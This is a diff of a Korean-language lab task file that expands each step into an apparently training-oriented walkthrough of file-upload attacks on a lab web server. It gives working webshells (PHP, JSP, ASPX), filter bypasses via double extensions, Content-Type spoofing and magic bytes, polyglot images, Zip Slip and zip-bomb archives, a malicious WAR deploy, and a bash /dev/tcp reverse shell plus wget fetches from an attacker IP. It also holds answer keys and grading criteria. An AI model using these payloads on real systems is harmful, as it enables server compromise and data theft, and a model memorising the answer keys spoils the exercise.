@@ -13,8 +13,46 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '{{WEB_IP}} 대상으로 업로드 기능 식별을(를) 수행하시오.'
-  hint: 업로드 기능 식별 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 파일 업로드 기능 식별을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl + grep 으로 form 검색
+    ```bash
+    # 모든 페이지의 file input 검색
+    curl -s http://10.20.30.80 | grep -ioE '<input[^>]*type="file"[^>]*>' | head -10
+    curl -s http://10.20.30.80 | grep -ioE '<form[^>]*enctype="multipart/form-data"[^>]*>' | head -10
+    curl -s http://10.20.30.80 | grep -ioE 'href="[^"]*(upload|attach)[^"]*"' | head -10
+    echo "업로드 기능 식별 완료"
+    ```
+
+    ▶ 2단계: 도구 B — gobuster (업로드 endpoint 발견)
+    ```bash
+    gobuster dir -u http://10.20.30.80 \
+      -w /usr/share/wordlists/dirb/common.txt \
+      -t 20 -p '^.*(upload|attach|file|image|avatar|profile).*$'
+    ```
+
+    ▶ 3단계: 도구 C — Burp Spider / OWASP ZAP Spider (자동 크롤)
+    1. Burp Proxy → 사이트 정상 사용 (회원가입/프로필/리뷰 등)
+    2. Site map → 우클릭 → Engagement Tools → **Find scripts/comments**
+    3. multipart/form-data 가 있는 모든 endpoint 자동 식별
+
+    ▶ 4단계: 도구 D — nuclei 의 file-upload 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/exposures/ -tags upload -silent
+    nuclei -u http://10.20.30.80 -t http/vulnerabilities/ -tags upload -silent
+    ```
+
+    ▶ 5단계: JuiceShop 업로드 endpoint 예
+    - `/api/Complaints` (PUT, file 첨부)
+    - `/profile` (avatar 업로드)
+    - `/api/Users/{id}/avatar` 등
+
+    ▶ 6단계: 답변
+    찾은 endpoint 1~2 개 quote + form action + accept 속성 분석.
+  hint: 'curl + grep file input / gobuster -p upload 패턴 / Burp/ZAP Spider / nuclei -tags upload.'
   category: upload
   points: 8
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '업로드 기능 식별 완료'
@@ -40,8 +78,55 @@ steps:
       - 업로드 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: '{{WEB_IP}} 대상으로 허용 파일 유형 확인을(를) 수행하시오.'
-  hint: 허용 파일 유형 확인 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 허용 파일 유형 확인을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — form 의 accept 속성 확인
+    ```bash
+    curl -s http://10.20.30.80/profile | grep -ioE 'accept="[^"]*"'
+    # 예: accept=".jpg,.png,.gif" / accept="image/*" / 없음 (= 모든 파일)
+    ```
+
+    ▶ 2단계: 도구 B — curl 으로 다양한 파일 유형 시도
+    ```bash
+    # 테스트 파일 준비
+    echo "test" > /tmp/test.txt
+    cp /usr/share/icons/*/8x8/*.png /tmp/test.png 2>/dev/null
+    echo "<?php phpinfo(); ?>" > /tmp/test.php
+    echo "<script>alert(1)</script>" > /tmp/test.html
+    cp /tmp/test.txt /tmp/test.exe
+    cp /tmp/test.txt /tmp/test.svg
+    cp /tmp/test.txt /tmp/test.zip
+
+    # 각 유형 업로드 시도
+    for f in /tmp/test.{txt,png,php,html,exe,svg,zip,sh,jsp}; do
+      [ -f "$f" ] || continue
+      echo "=== $f ==="
+      curl -s -X POST http://10.20.30.80/api/upload \
+           -F "file=@$f" -i | head -1
+    done
+    echo "허용 파일 유형 확인 완료"
+    ```
+
+    ▶ 3단계: 도구 C — fuzzing wordlist (확장자 자동)
+    ```bash
+    # SecLists 의 Web-Shells/file-extensions 사용
+    cat /usr/share/seclists/Discovery/Web-Content/Web-Shells/FuzzDB/file-ul-filter-bypass-x-platform-generic.txt | head
+    # 또는 PayloadsAllTheThings
+    cat ~/PATT/Upload\ Insecure\ Files/Extension\ PHP/extensions.lst
+    ```
+
+    ▶ 4단계: 도구 D — Burp Intruder 자동 fuzzing
+    1. 정상 업로드 요청 캡처
+    2. **Send to Intruder** → filename 부분 §...§ marking
+    3. Payloads → SecLists upload 확장자 wordlist
+    4. Start Attack → Status / Length 차이로 허용/차단 자동 분류
+
+    ▶ 5단계: 답변
+    각 확장자 응답 코드 (200/415/403) quote + 허용/차단 분류 + 화이트리스트 vs 블랙리스트 분석.
+  hint: 'form accept 속성 / curl 다양 확장자 / SecLists / Burp Intruder fuzzing.'
   category: upload
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '허용 파일 유형 확인 완료'
@@ -67,8 +152,62 @@ steps:
       - 필터 분석 없음
   target_vm: attacker
 - order: 3
-  instruction: '{{WEB_IP}} 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행하시오.'
-  hint: 확장자 필터 우회(이중 확장자) 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 확장자 필터 우회(이중 확장자)를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 이중 확장자 패턴 (서버 파싱 차이 악용)
+    ```bash
+    # 1. 이중 확장자 (Apache mod_mime: 마지막 알 수 있는 확장자만 반영)
+    cp shell.php shell.php.jpg
+    curl -F "file=@shell.php.jpg" http://target/api/upload
+    # Apache 가 .jpg 인식 후 .php 까지 fallback → PHP 실행 가능
+
+    # 2. 역순 (Nginx 일부 설정에서 파싱)
+    cp shell.php shell.jpg.php
+    curl -F "file=@shell.jpg.php" http://target/api/upload
+
+    # 3. NULL byte truncation (legacy PHP < 5.3.4)
+    curl -F "file=@shell.php%00.jpg" http://target/api/upload
+    # Old PHP: %00 으로 문자열 종료 → .php 만 인식
+
+    # 4. 대소문자 (case-sensitive 필터 우회)
+    cp shell.php shell.PhP
+    cp shell.php shell.pHP
+
+    # 5. 변형 PHP 확장자 (블랙리스트 우회)
+    for ext in php3 php4 php5 php7 php8 phtml phar pht inc; do
+      cp shell.php shell.$ext
+      curl -F "file=@shell.$ext" http://target/api/upload
+    done
+    ```
+
+    ▶ 2단계: 서버별 파싱 룰
+    | 서버 | 파싱 |
+    |---|---|
+    | **Apache** | 마지막 매칭 mime → fallback (`.php.jpg` = jpg + 알수없으면 php) |
+    | **Nginx + PHP-FPM** | location 블록 정규식 (`/.+\.php$/` 만 → 우회 어려움) |
+    | **IIS 6** | 세미콜론 트릭 `shell.asp;.jpg` → .asp 실행 (legacy) |
+    | **Tomcat** | `.jsp` / `.jspx` / `.jsf` |
+
+    ▶ 3단계: 도구 — Burp Intruder + PayloadsAllTheThings
+    1. 정상 업로드 캡처 → Intruder
+    2. filename §...§ marking
+    3. Payloads → PayloadsAllTheThings/Upload Insecure Files/Extension PHP/
+    4. Status code/Length 차이로 우회 성공 확인
+
+    ▶ 4단계: 도구 — wfuzz 으로 자동
+    ```bash
+    wfuzz -c -X POST -u http://10.20.30.80/api/upload \
+          -w ~/PATT/Upload\ Insecure\ Files/extensions.lst \
+          --multipart "file=shell.FUZZ;@/tmp/shell.php" \
+          --hh 415  # 415 (지원 안함) 응답 hide
+    ```
+
+    ▶ 5단계: 답변
+    성공한 우회 페이로드 (예: `shell.php.jpg`) + 응답 코드 200 quote + 서버 파싱 차이 1 문장.
+  hint: '5 패턴 (이중/역순/null/case/변형) / 서버별 파싱 / Burp Intruder + PayloadsAllTheThings / wfuzz.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '확장자 필터 우회(이중
@@ -95,8 +234,65 @@ steps:
       - 파싱 맥락 없음
   target_vm: attacker
 - order: 4
-  instruction: '{{WEB_IP}} 대상으로 Content-Type 변조 업로드을(를) 수행하시오.'
-  hint: Content-Type 변조 업로드 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 Content-Type 변조 업로드을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl -F 의 type 옵션 (가장 쉬움)
+    ```bash
+    # PHP shell 을 image/jpeg 로 위장
+    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+    curl -X POST http://10.20.30.80/api/upload \
+         -F "file=@/tmp/shell.php;type=image/jpeg"
+    # type=...: Content-Type 헤더 강제 (기본 application/octet-stream → image/jpeg)
+    ```
+
+    ▶ 2단계: 도구 B — Burp Repeater 로 multipart 직접 편집
+    ```http
+    POST /api/upload HTTP/1.1
+    Host: 10.20.30.80
+    Content-Type: multipart/form-data; boundary=----X
+
+    ------X
+    Content-Disposition: form-data; name="file"; filename="shell.php"
+    Content-Type: image/jpeg          <-- 변조
+
+    <?php system($_GET['c']); ?>
+    ------X--
+    ```
+
+    ▶ 3단계: 도구 C — Python requests
+    ```python
+    import requests
+    files = {
+      'file': ('shell.php', open('/tmp/shell.php', 'rb'), 'image/jpeg')
+      #         filename       binary content              Content-Type 변조
+    }
+    r = requests.post('http://10.20.30.80/api/upload', files=files)
+    print(r.status_code, r.text[:200])
+    ```
+
+    ▶ 4단계: Content-Type 우회 변형
+    | 헤더 값 | 우회 시나리오 |
+    |---|---|
+    | `image/jpeg` | image-only 필터 우회 |
+    | `image/png` | 동일 |
+    | `text/plain` | CSRF preflight 회피 |
+    | `application/pdf` | document-only 필터 우회 |
+    | `application/octet-stream` (없음) | 기본값 |
+    | 거짓 다중 (`type=image/jpeg, application/x-php`) | 일부 parser 가 첫 값만 |
+
+    ▶ 5단계: 도구 D — magic byte + Content-Type 결합 (다음 step 6 와 연계)
+    ```bash
+    # GIF magic byte + PHP 코드 + Content-Type 변조
+    printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > /tmp/shell.gif.php
+    curl -F "file=@/tmp/shell.gif.php;type=image/gif" http://target/api/upload
+    ```
+
+    ▶ 6단계: 답변
+    Content-Type 변조 명령 quote + 응답 (200 = 우회 성공) + 방어 (서버측 magic byte 검증) 1 문장.
+  hint: 'curl -F type=... / Burp Repeater multipart 편집 / Python requests / Content-Type 우회 변형 표.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'Content-Type
@@ -123,8 +319,68 @@ steps:
       - MIME 검증 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: '{{WEB_IP}} 대상으로 매직 바이트 조작 업로드을(를) 수행하시오.'
-  hint: 매직 바이트 조작 업로드 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 매직 바이트 조작 업로드을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 매직 바이트 (file signature) 표
+    | 형식 | Magic bytes (hex) | 텍스트 |
+    |---|---|---|
+    | JPEG | `FF D8 FF E0` 또는 `FF D8 FF E1` | — |
+    | PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG` |
+    | GIF87a | `47 49 46 38 37 61` | `GIF87a` |
+    | GIF89a | `47 49 46 38 39 61` | `GIF89a` |
+    | PDF | `25 50 44 46 2D` | `%PDF-` |
+    | ZIP | `50 4B 03 04` | `PK\x03\x04` |
+    | ELF | `7F 45 4C 46` | `\x7fELF` |
+
+    ▶ 2단계: 도구 A — printf 으로 magic byte + PHP 결합
+    ```bash
+    # GIF magic + PHP 코드
+    printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > /tmp/shell.gif
+    file /tmp/shell.gif    # → "GIF image data, version 89a" (file 명령 속음)
+
+    # PNG magic + PHP 코드
+    printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > /tmp/shell.png
+
+    # JPEG magic + PHP 코드 (EXIF 영역 활용)
+    printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xfe\x00\x14<?php system($_GET["c"]); ?>' > /tmp/shell.jpg
+    ```
+
+    ▶ 3단계: 도구 B — exiftool 으로 메타데이터 영역에 코드 삽입
+    설치: `sudo apt install libimage-exiftool-perl`. 사용:
+    ```bash
+    cp normal.jpg /tmp/shell.jpg
+    exiftool -comment='<?php system($_GET["c"]); ?>' /tmp/shell.jpg
+    # comment 영역에 PHP 코드 삽입 → 정상 이미지 + 코드 동시
+    ```
+
+    ▶ 4단계: 도구 C — polyglot 파일 (정상 이미지 + 실행 코드)
+    ```bash
+    # GIF + JS polyglot (브라우저는 이미지 + script 둘 다 처리)
+    printf 'GIF89a/*<svg/onload=alert(1)>*/=2;' > /tmp/poly.gif
+
+    # JPG + ZIP polyglot (jar 형태로 실행)
+    cat shell.jpg shell.zip > /tmp/poly.jar
+    ```
+
+    ▶ 5단계: 도구 D — file 명령으로 검증 우회 시뮬
+    ```bash
+    # 서버가 file 명령으로 mime 검증 시
+    file /tmp/shell.gif
+    # → "GIF image data, version 89a, ..." (속임)
+    file -b --mime-type /tmp/shell.gif
+    # → "image/gif"
+
+    # 그러나 .php 확장자 + GIF 헤더 = 일부 서버 PHP 실행
+    cp /tmp/shell.gif /tmp/shell.php
+    curl -F "file=@/tmp/shell.php" http://target/api/upload
+    ```
+
+    ▶ 6단계: 답변
+    `file /tmp/shell.gif` 출력 quote + magic byte 우회 원리 + 방어 (전체 파일 검증, ImageMagick re-encode) 1 문장.
+  hint: 'magic byte 표 / printf 결합 / exiftool comment / polyglot / file 명령 우회.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '매직 바이트 조작 업로드
@@ -151,8 +407,84 @@ steps:
       - file 검증 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: '{{WEB_IP}} 대상으로 웹쉘 업로드 시도을(를) 수행하시오.'
-  hint: 웹쉘 업로드 시도 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 웹쉘 업로드 시도를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — 간이 PHP 웹쉘 (수동)
+    ```bash
+    # 1줄 웹쉘 (가장 단순)
+    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+
+    # POST 본문에서 명령 받음
+    cat > /tmp/shell.php <<'EOF'
+    <?php
+    if (isset($_POST['cmd'])) {
+        echo "<pre>";
+        system($_POST['cmd']);
+        echo "</pre>";
+    }
+    ?>
+    <form method="POST"><input name="cmd"><button>Run</button></form>
+    EOF
+
+    # 업로드 + 실행 검증
+    curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.30.80/api/upload
+    curl "http://10.20.30.80/uploads/shell.php?c=id"
+    # 응답: uid=33(www-data) gid=33(www-data)
+    echo "웹쉘 업로드 시도 완료"
+    ```
+
+    ▶ 2단계: 도구 B — weevely (백도어 + 클라이언트, 가장 종합)
+    설치: `sudo apt install weevely`. 사용:
+    ```bash
+    # 1. 백도어 생성 (비밀번호 보호)
+    weevely generate s3cr3t /tmp/shell.php
+    # → /tmp/shell.php (PHP 코드, base64 인코딩)
+
+    # 2. 업로드
+    curl -F "file=@/tmp/shell.php" http://target/api/upload
+
+    # 3. 클라이언트 접속
+    weevely http://target/uploads/shell.php s3cr3t
+    # 인터랙티브 셸 + 30+ 모듈 (file_upload/sql_console/proxy/persistence)
+    ```
+
+    ▶ 3단계: 도구 C — p0wny-shell / b374k (full-featured GUI)
+    ```bash
+    # p0wny-shell (단일 .php, 파일 매니저 + 명령 실행)
+    wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O /tmp/p0wny.php
+    curl -F "file=@/tmp/p0wny.php" http://target/api/upload
+    # 브라우저로 http://target/uploads/p0wny.php → GUI 셸
+
+    # b374k (UI 풍부 + DB 관리)
+    git clone https://github.com/b374k/b374k ~/b374k
+    php ~/b374k/index.php -o /tmp/b374k.php -p s3cr3t
+    ```
+
+    ▶ 4단계: 도구 D — msfvenom 으로 다양한 페이로드
+    ```bash
+    # PHP reverse shell
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw -o /tmp/rev.php
+    # 업로드 + Metasploit handler
+    msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST 10.20.30.201; set LPORT 4444; run"
+    ```
+
+    ▶ 5단계: 다른 언어
+    | 언어 | 1줄 웹쉘 |
+    |---|---|
+    | PHP | `<?php system($_GET["c"]); ?>` |
+    | JSP | `<%= Runtime.getRuntime().exec(request.getParameter("c")).getInputStream() %>` |
+    | ASPX | `<%@ Page Language="C#" %><%= System.Diagnostics.Process.Start(Request["c"]) %>` |
+    | Node.js | (server-side rendering 시) `<%= require('child_process').execSync(c) %>` |
+    | Python | (Flask) `{{ request.application.__globals__.__builtins__.__import__("os").popen("c").read() }}` |
+
+    ▶ 6단계: 답변
+    웹쉘 업로드 명령 + `id` 실행 결과 (`uid=33(www-data)`) quote + 방어 (실행 권한 제거 / chroot / Docker) 1 문장.
+
+    **윤리**: 점검 환경 only. 실 환경 웹쉘 업로드는 *형법상 정보통신망 침해*.
+  hint: '간이 PHP 웹쉘 / weevely / p0wny-shell / b374k / msfvenom / 다언어 1줄 쉘.'
   category: exploit
   points: 12
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '웹쉘 업로드 시도 완료'
@@ -178,8 +510,79 @@ steps:
       - 장악 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: '{{WEB_IP}} 대상으로 이미지 파일 내 코드 삽입을(를) 수행하시오.'
-  hint: 이미지 파일 내 코드 삽입 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 이미지 파일 내 코드 삽입을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — exiftool (메타데이터 영역에 코드)
+    ```bash
+    # 정상 이미지 다운로드
+    wget -O /tmp/normal.jpg https://example.com/image.jpg
+    # 또는 attacker VM 의 기존 이미지
+
+    # comment 영역에 PHP 코드 삽입
+    exiftool -comment='<?php system($_GET["c"]); ?>' /tmp/normal.jpg
+
+    # 검증
+    exiftool /tmp/normal.jpg | grep Comment
+    file /tmp/normal.jpg  # 여전히 JPEG 정상 인식
+
+    # 업로드 (.php 확장자 + JPEG 헤더)
+    cp /tmp/normal.jpg /tmp/poly.php.jpg
+    curl -F "file=@/tmp/poly.php.jpg" http://target/api/upload
+    ```
+
+    ▶ 2단계: 도구 B — steghide (스테가노그래피 + 비밀 데이터)
+    ```bash
+    sudo apt install steghide
+    # 비밀 파일 임베드
+    echo "<?php system(\$_GET['c']); ?>" > secret.php
+    steghide embed -cf cover.jpg -ef secret.php -p s3cr3t -sf /tmp/embed.jpg
+    # 추출
+    steghide extract -sf /tmp/embed.jpg -p s3cr3t
+    ```
+
+    ▶ 3단계: 도구 C — polyglot 파일 (정상 이미지 + 실행 가능 코드)
+    ```bash
+    # GIFAR (GIF + JAR) — Java applet 으로 실행
+    cat normal.gif evil.jar > /tmp/poly.gif
+
+    # JPG + ZIP polyglot
+    cat normal.jpg evil.zip > /tmp/poly.jpg
+    # unzip 으로 ZIP 부분 추출 가능 (zip slip 공격 활용)
+
+    # SVG + JS (브라우저에서 XSS)
+    cat > /tmp/evil.svg <<'EOF'
+    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
+      <text>image</text>
+    </svg>
+    EOF
+    curl -F "file=@/tmp/evil.svg" http://target/api/upload
+    # SVG 가 보여지면 XSS 발동
+    ```
+
+    ▶ 4단계: 도구 D — gif-php-polyglot (1줄 페이로드)
+    ```bash
+    # GIF 헤더 + PHP 결합 (file 명령은 GIF 인식, PHP 인터프리터는 PHP 실행)
+    printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > /tmp/x.php
+    file /tmp/x.php  # → GIF image data
+    ```
+
+    ▶ 5단계: 도구 E — ImageMagick GhostScript RCE (CVE-2018-16509)
+    ```bash
+    # ImageMagick 가 PostScript 파일 변환 시 명령 실행
+    cat > /tmp/exploit.svg <<'EOF'
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <image xlink:href="msl:/path/to/exploit.msl"/>
+    </svg>
+    EOF
+    # 자세한 페이로드는 ImageTragick 참조 (ImageMagick 6.9.3-9 미만)
+    ```
+
+    ▶ 6단계: 답변
+    exiftool 또는 polyglot 으로 코드 삽입 + `file` 명령 출력 (정상 이미지) quote + 방어 (server-side re-encode + EXIF 제거) 1 문장.
+  hint: 'exiftool comment / steghide 임베드 / polyglot (GIFAR/JPG+ZIP/SVG) / GIF-PHP / ImageTragick.'
   category: exploit
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '이미지 파일 내 코드 삽입
@@ -208,8 +611,76 @@ steps:
       - polyglot 맥락 없음
   target_vm: attacker
 - order: 8
-  instruction: '{{WEB_IP}} 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행하시오.'
-  hint: ZIP 파일 업로드 취약점 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 ZIP 파일 업로드 취약점 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: Zip Slip 공격 (path traversal)
+    서버가 zip 자동 추출 시 entry path 검증 안 하면 임의 경로 쓰기.
+    ```bash
+    # evilarc 도구 (Zip Slip 자동 생성)
+    git clone https://github.com/ptoomey3/evilarc ~/evilarc
+    cd ~/evilarc
+    python3 evilarc.py shell.php -d 6 -p var/www/html -o unix
+    # ../../../../../var/www/html/shell.php 경로 entry 가 zip 안에 들어감
+    # 서버가 unzip 시 -> /var/www/html/shell.php 에 쓰기 → RCE
+
+    curl -F "file=@evil.zip" http://target/api/upload
+    curl http://target/shell.php?c=id
+    ```
+
+    ▶ 2단계: 도구 A — 수동 zip slip
+    ```bash
+    # zip 명령으로 ../ path 포함 entry 생성 (Linux)
+    cd /tmp && mkdir -p slip && cd slip
+    ln -s /etc/passwd link  # symlink
+    zip --symlinks /tmp/symlink.zip link
+    # 또는 path traversal 직접
+    echo "shell" > shell.php
+    zip /tmp/zipslip.zip shell.php
+    # zip 내용을 hex 편집기로 path 변경 (../../../var/www/html/shell.php)
+    ```
+
+    ▶ 3단계: 도구 B — Zip Bomb (DoS)
+    ```bash
+    # 작은 zip → 큰 압축 해제 (원자력 zip 42.zip)
+    wget https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip /tmp/bomb.zip
+    # 42 KB → 4.5 GB (원자 폭탄)
+
+    # 또는 직접 생성
+    python3 -c "
+    import zipfile
+    data = b'A' * (1024*1024)  # 1 MB
+    with zipfile.ZipFile('/tmp/bomb.zip', 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
+        for i in range(1000):
+            zf.writestr(f'{i}.txt', data)
+    "
+    ls -la /tmp/bomb.zip  # 작은 크기 → 압축 해제 시 1 GB
+    ```
+
+    ▶ 4단계: 도구 C — symlink 공격
+    ```bash
+    # symlink 가 포함된 zip
+    ln -s /etc/passwd /tmp/passwd_link
+    cd /tmp && zip --symlinks symlink.zip passwd_link
+    # 서버가 zip 추출 + symlink 따라가면 → /etc/passwd 노출
+    ```
+
+    ▶ 5단계: 도구 D — JAR / WAR 파일 (Tomcat 환경)
+    ```bash
+    # 악성 JSP 가 포함된 WAR
+    mkdir -p /tmp/evil/META-INF
+    echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("c")); %>' > /tmp/evil/shell.jsp
+    cd /tmp/evil && jar -cf /tmp/evil.war .
+
+    # Tomcat manager 에 deploy (인증 정보 있을 시)
+    curl -u admin:admin -F "file=@/tmp/evil.war" http://target:8080/manager/text/deploy?path=/evil
+    ```
+
+    ▶ 6단계: 답변
+    evilarc 또는 수동 zip slip 페이로드 + 응답 200 quote + 방어 (zip entry path 검증, ZipFile.extractall(safe_path) 직접 검증) 1 문장.
+  hint: 'evilarc Zip Slip / 수동 zip / Zip Bomb DoS / symlink / JAR/WAR Tomcat.'
   category: exploit
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'ZIP 파일 업로드 취약점
@@ -236,8 +707,55 @@ steps:
       - Path Traversal 누락
   target_vm: attacker
 - order: 9
-  instruction: '{{WEB_IP}} 대상으로 업로드 경로 추측을(를) 수행하시오.'
-  hint: 업로드 경로 추측 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 업로드 경로 추측을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 일반 업로드 경로 패턴
+    | 경로 | 사용 |
+    |---|---|
+    | `/uploads/`, `/upload/` | 가장 흔함 |
+    | `/files/`, `/file/` | document-style |
+    | `/images/`, `/img/`, `/media/` | image-only |
+    | `/avatars/`, `/profile/` | user-content |
+    | `/static/`, `/public/` | CDN-friendly |
+    | `/wp-content/uploads/` | WordPress |
+    | `/sites/default/files/` | Drupal |
+    | `/var/www/html/uploads/` (서버 path) | 직접 노출 시 |
+
+    ▶ 2단계: 도구 A — gobuster 으로 경로 brute force
+    ```bash
+    gobuster dir -u http://10.20.30.80 \
+      -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+      -t 20 --status-codes 200,301,302,403 \
+      | grep -iE 'upload|file|media|attach|avatar'
+    ```
+
+    ▶ 3단계: 도구 B — ffuf 자동 발견
+    ```bash
+    ffuf -u http://10.20.30.80/FUZZ \
+         -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+         -mc 200,301,302,403 \
+         -mr 'upload|file' -t 40
+    ```
+
+    ▶ 4단계: 도구 C — 업로드된 파일 응답 분석
+    ```bash
+    # 업로드 응답에 path 가 noticeably 노출됨
+    curl -F "file=@/tmp/test.png" http://10.20.30.80/api/upload -i | grep -iE 'location|url|path|/(uploads|files)/'
+    ```
+
+    ▶ 5단계: 도구 D — meta 분석 (정상 이미지 URL 에서 패턴 추출)
+    ```bash
+    # 사이트의 정상 이미지 URL 검색
+    curl -s http://10.20.30.80 | grep -oE 'https?://[^"]+\.(jpg|png|gif|pdf)' | head
+    # 패턴 발견 → /static/img/... 또는 /uploads/2026/05/...
+    ```
+
+    ▶ 6단계: 답변
+    발견된 path 1~2 quote + nmap/gobuster/ffuf 결과 + 업로드 위치 특정.
+  hint: '경로 패턴 표 / gobuster -w / ffuf -mr / 응답에서 path 추출 / 정상 이미지 URL 분석.'
   category: recon
   points: 10
   answer: nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '업로드 경로 추측
@@ -264,8 +782,74 @@ steps:
       - 업로드 맥락 없음
   target_vm: attacker
 - order: 10
-  instruction: '{{WEB_IP}} 대상으로 업로드된 파일 실행 확인을(를) 수행하시오.'
-  hint: 업로드된 파일 실행 확인 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 업로드된 파일 실행 확인을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 RCE 검증
+    ```bash
+    # 1줄 웹쉘 업로드 후
+    curl -F "file=@/tmp/shell.php" http://10.20.30.80/api/upload
+    # 응답에서 path 추출 → 직접 호출
+    curl "http://10.20.30.80/uploads/shell.php?c=id"
+    # 정상: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    # 추가 명령
+    curl "http://10.20.30.80/uploads/shell.php?c=uname+-a"
+    curl "http://10.20.30.80/uploads/shell.php?c=ls+-la+/etc"
+    curl "http://10.20.30.80/uploads/shell.php?c=cat+/etc/passwd"
+    echo "업로드된 파일 실행 확인 완료"
+    ```
+
+    ▶ 2단계: 도구 B — weevely 인터랙티브 셸
+    ```bash
+    weevely http://target/uploads/shell.php s3cr3t
+    # weevely> :system_info
+    # weevely> :file_ls /etc
+    # weevely> ls -la
+    # weevely> :sql_console (DB 연결)
+    # weevely> :persistence_install (지속성)
+    ```
+
+    ▶ 3단계: 도구 C — Metasploit handler (reverse shell)
+    ```bash
+    # PHP reverse shell 업로드 시
+    msfconsole -q -x "
+    use exploit/multi/handler
+    set payload php/meterpreter_reverse_tcp
+    set LHOST 10.20.30.201
+    set LPORT 4444
+    run
+    "
+    # 다른 터미널에서 트리거
+    curl http://target/uploads/rev.php
+    ```
+
+    ▶ 4단계: 도구 D — netcat 기본 reverse shell (Metasploit 없을 시)
+    ```bash
+    # listener (attacker)
+    nc -lvnp 4444
+
+    # 트리거 — webshell 으로 reverse 연결 명령 실행
+    PAYLOAD='bash -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1"'
+    curl "http://target/uploads/shell.php?c=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)"
+    # nc 에서 인터랙티브 셸 받음
+    ```
+
+    ▶ 5단계: 도구 E — 후속 권한 상승 (linpeas/pspy 자동)
+    ```bash
+    # 셸 안에서
+    wget http://10.20.30.201:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+    # 또는 pspy 로 cron job 모니터
+    wget http://10.20.30.201:8000/pspy64 && chmod +x pspy64 && ./pspy64
+    ```
+
+    ▶ 6단계: 답변
+    `id` 실행 결과 (`uid=33(www-data)`) quote + 영향 (RCE 확정) + 방어 (실행 권한 제거 / chroot / Docker 격리) 1 문장.
+
+    **윤리**: 점검 환경 only. 실 환경 RCE = *형법상 정보통신망 침해*.
+  hint: 'curl ?c=cmd / weevely 인터랙티브 / msfconsole handler / netcat reverse shell / linpeas 후속.'
   category: exploit
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '업로드된 파일 실행 확인
@@ -292,8 +876,55 @@ steps:
       - RCE 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: '{{WEB_IP}} 대상으로 파일 크기 제한 테스트을(를) 수행하시오.'
-  hint: 파일 크기 제한 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 파일 크기 제한 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — 다양한 크기 파일 생성 + 업로드
